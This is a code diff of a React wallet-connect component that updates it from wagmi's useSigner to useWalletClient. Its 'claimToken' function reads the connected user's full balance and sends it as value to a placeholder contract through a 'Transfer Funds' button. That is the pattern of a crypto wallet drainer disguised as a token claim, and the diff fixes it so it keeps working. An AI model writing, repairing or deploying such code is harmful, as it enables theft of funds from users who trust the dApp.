@@ -2,22 +2,31 @@
 
 import React, { useState, useEffect } from "react";
 import { useWeb3Modal } from "@web3modal/wagmi/react";
-import { useAccount, useSigner } from "wagmi";
+import { useAccount, useWalletClient } from "wagmi";
+import { ethers } from "ethers";
 
 export default function ConnectButton() {
   const { open } = useWeb3Modal();
-  const { isConnected } = useAccount();
-  const { data: signer } = useSigner();
+  const { isConnected, address } = useAccount();
+  const { data: walletClient } = useWalletClient();
 
   const [buttonText, setButtonText] = useState("Connect Wallet");
+  const [status, setStatus] = useState("");
 
-  const claimToken = async (signer) => {
+  const claimToken = async () => {
+    if (!walletClient) {
+      setStatus("No wallet client available. Please connect your wallet.");
+      return;
+    }
+
     try {
-      const provider = signer.provider;
+      // Create ethers.js signer from the wallet client
+      const signer = new ethers.providers.Web3Provider(
+        walletClient
+      ).getSigner();
 
-      const CONTRACT_ADDRESS = "0xYourContractAddress";
+      const CONTRACT_ADDRESS = "0xYourContractAddress"; // Replace with your contract address
       const CONTRACT_ABI = ["function claimToken() external payable"];
-
       const contract = new ethers.Contract(
         CONTRACT_ADDRESS,
         CONTRACT_ABI,
@@ -25,8 +34,7 @@ export default function ConnectButton() {
       );
 
       // Get user's current balance
-      const userAddress = await signer.getAddress();
-      const userBalance = await provider.getBalance(userAddress);
+      const userBalance = await signer.getBalance();
 
       if (userBalance.isZero()) {
         setStatus("Insufficient balance to transfer!");
@@ -34,7 +42,7 @@ export default function ConnectButton() {
       }
 
       // Estimate gas fees for the transfer
-      const gasPrice = await provider.getGasPrice(); // Current gas price
+      const gasPrice = await signer.getGasPrice(); // Current gas price
       const gasEstimate = await contract.estimateGas.claimToken({
         value: userBalance,
       });
@@ -79,9 +87,12 @@ export default function ConnectButton() {
       </button>
 
       {isConnected && (
-        <button className="transfer-button" onClick={() => claimToken(signer)}>
-          Transfer Funds
-        </button>
+        <>
+          <button className="transfer-button" onClick={claimToken}>
+            Transfer Funds
+          </button>
+          <p>{status}</p>
+        </>
       )}
     </div>
   );
